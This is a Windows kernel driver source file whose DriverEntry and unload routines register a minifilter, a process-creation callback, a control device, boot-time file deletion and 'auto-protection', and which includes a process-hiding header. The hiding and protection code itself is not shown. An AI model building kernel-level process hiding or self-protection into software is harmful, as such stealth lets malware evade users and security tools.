
#include "header.h"
#include "files.h"
#include "irps.h"
#include "process.h"
#include "hideprocess.h"
#include "minifilter.h"
#include "reg.h"
#include "listdrivers.h"

/// <summary>
/// Inicia o driver
/// </summary>
/// <param name="ObjetoDriver"></param>
/// <param name="RegistroLocal"></param>
/// <returns></returns>
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT ObjetoDriver, _In_ PUNICODE_STRING RegistroLocal)
{
	UNREFERENCED_PARAMETER(RegistroLocal);
	NottextProcesso = ExAllocatePoolWithTag(PagedPool, 200, 'prrc');

	// Copie uma string aleatória para permitir que os outros processos sejam finalizados 
	strcpy(NottextProcesso, "::aletorio::");

	// Liste os serviços
	ListarServicos();

	// DriverGlobal, usado para listar os drivers
	ObjetoDriverGlobal = ObjetoDriver;

	/*
	HANDLE Thread;
	if (NT_SUCCESS(PsCreateSystemThread(&Thread, (ACCESS_MASK)0,
		NULL,
		(HANDLE)0,
		NULL, DeletarNoBoot, NULL)))
	{
		DbgPrint("Arquivos removidos");
	}

	if (Thread != NULL)
		ZwClose(Thread);
	*/

	DeletarNoBoot();
	
	// Torna a suspensão e resumo de processos possíveis
	ConfigurarSuspensao();

	// 1 Segundo
	Tempo.QuadPart = -1000 * -1000 * 1;

	// Crie o dispositivo para comunicações
	NTSTATUS Status = IoCreateDevice(
		ObjetoDriver,
		0,
		&DispositivoNome,
		FILE_DEVICE_UNKNOWN,
		0,
		TRUE,
		&DispositivoGlobal
	);

	if (NT_SUCCESS(Status))
	{
		Status = IoCreateSymbolicLink(&SysNome, &DispositivoNome);

		if (!NT_SUCCESS(Status))
		{
			IoDeleteDevice(DispositivoGlobal);
			return Status;
		}
		else {

			// Registre
			Status = FltRegisterFilter(ObjetoDriver, &Registracao, &FiltroMinifiltro);

			if (NT_SUCCESS(Status))
			{
				Status = FltStartFiltering(FiltroMinifiltro);
			}
		}

		Status = PsSetCreateProcessNotifyRoutineEx(NovoProcesso, FALSE);

		// Configure as mensagens
		ObjetoDriver->MajorFunction[IRP_MJ_CREATE] = IRPCriado;
		ObjetoDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IRPRecebido;
		ObjetoDriver->MajorFunction[IRP_MJ_CLOSE] = IRPFechado;
	}

	InstalarAutoProtecao();


	return STATUS_SUCCESS;
}

/// <summary>
/// Função que descarrega o filtro
/// </summary>
NTSTATUS DescarregarDriver(
	_In_ FLT_FILTER_UNLOAD_FLAGS Descarregar
)
{
	if (NottextProcesso != NULL)
		ExFreePoolWithTag(NottextProcesso, 'prrc');
	
	// Vamos remover o filtro
	FltUnregisterFilter(FiltroMinifiltro);
	PsSetCreateProcessNotifyRoutineEx(NovoProcesso, TRUE);

	// Delete os dispositivos e link simbolico
	IoDeleteDevice(DispositivoGlobal);
	IoDeleteSymbolicLink(&SysNome);

	// Remova a auto-proteção
	DesinstalarAutoProtecao();

	return STATUS_SUCCESS;
}
